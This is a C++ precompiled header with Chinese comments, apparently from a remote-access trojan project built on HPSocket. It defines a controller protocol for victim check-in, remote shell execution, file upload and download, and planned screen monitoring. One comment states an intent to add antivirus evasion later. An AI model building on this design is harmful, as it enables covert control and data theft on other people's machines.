// pch.h: 这是预编译标头文件。
// 下方列出的文件仅编译一次，提高了将来生成的生成性能。
// 这还将影响 IntelliSense 性能，包括代码完成和许多代码浏览功能。
// 但是，如果此处列出的文件中的任何一个在生成之间有更新，它们全部都将被重新编译。
// 请勿在此处添加要频繁更新的文件，这将使得性能优势无效。

#ifndef PCH_H
#define PCH_H

// 添加要在此处预编译的标头

#include "./HPSocket/HPSocket.h"


// 这样不行，要在工程属性-> C/C++ -> 预处理器 -> 预处理器定义 中定义预处理宏HPSOCKET_STATIC_LIB
//#ifndef HPSOCKET_STATIC_LIB
//	#define HPSOCKET_STATIC_LIB
//#endif


// 之后要做一些免杀，所以就不支持x64了，下面两个就都用x86的吧。
//#ifdef _DEBUG
//	#pragma comment(lib, "./HPSocket/HPSocket_UD.lib")
//#else
//	#pragma comment(lib, "./HPSocket/HPSocket_U.lib")
//#endif

#ifdef _DEBUG
	#pragma comment(lib, "./HPSocket/MTd/HPSocket_UD.lib")
#else
	#pragma comment(lib, "./HPSocket/MD/HPSocket_U.lib")
#endif


#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <assert.h>





enum COMMAND_ID {
	CRYPTO_KEY,				// 传递通信密钥和IV
	LOGIN,					// 上线包

	ECHO,					// 测试发包

	// 远程SHELL
	SHELL_CONNECT,				// 被控端新建一条子socket用于远程SHELL
	SHELL_EXECUTE,				// 执行SHELL
	SHELL_EXECUTE_RESULT,		// 执行SHELL的结果，一个SHELL_EXECUTE可能有多个SHELL_EXECUTE_RESULT
	SHELL_EXECUTE_RESULT_OVER,	// SHELL_EXECUTE的所有SHELL_EXECUTE_RESULT均发送完成后，用此包告知主控端
	SHELL_CLOSE,				// 关闭SHELL


	// 文件上传
	FILE_UPLOAD_CONNECT,	// 新建一条socket连接用于文件传输，每条socket只传一个文件就关闭
	FILE_UPLOAD_INFO,		// 文件大小、分片数等信息
	FILE_UPLOAD_DATA,		// 文件上传的数据包（非最后一个）
	FILE_UPLOAD_DATA_TAIL,	// 文件上传的数据包，最后一个分片
	FILE_UPLOAD_CLOSE,		// 关闭文件传输


	// 文件下载
	FILE_DOWNLOAD_CONNECT,
	FILE_DOWNLOAD_INFO,
	FILE_DOWNLOAD_DATA,
	FILE_DOWNLOAD_DATA_TAIL,
	FILE_DOWNLOAD_CLOSE,


	// TODO
	// 文件管理
	FILE_MANAGE_CONNECT,
	// 屏幕监控
	SCREEN_MONITOR,
	// 弹窗
	MESSAGE_BOX,
};


enum CLIENT_STATUS {
	NOT_ONLINE,			// 客户端（即受控端）不在线
	WAIT_FOR_LOGIN,		// 等待上线包（使用对称加密算法加密），该包有IP，CPU，系统版本等信息。
	LOGINED				// 已登录，（接收到通信密钥和上线包后）正式建立通信。
};


#define CRYPTO_KEY_PACKET_LENGTH (1+256)
#define CRYPTO_KEY_PACKET_TOKEN_FOR_MAIN_SOCKET (0xAB)
#define CRYPTO_KEY_PACKET_TOKEN_FOR_CHILD_SOCKET (0xCD)


#ifndef QWORD
	#define QWORD int64_t
#endif


//#ifdef _DEBUG
//	#define DebugPrint(...) printf(__VA_ARGS__)
//#else
//	#define DebugPrint(...) 
//#endif
#define DebugPrint(...) printf(__VA_ARGS__)

#endif //PCH_H
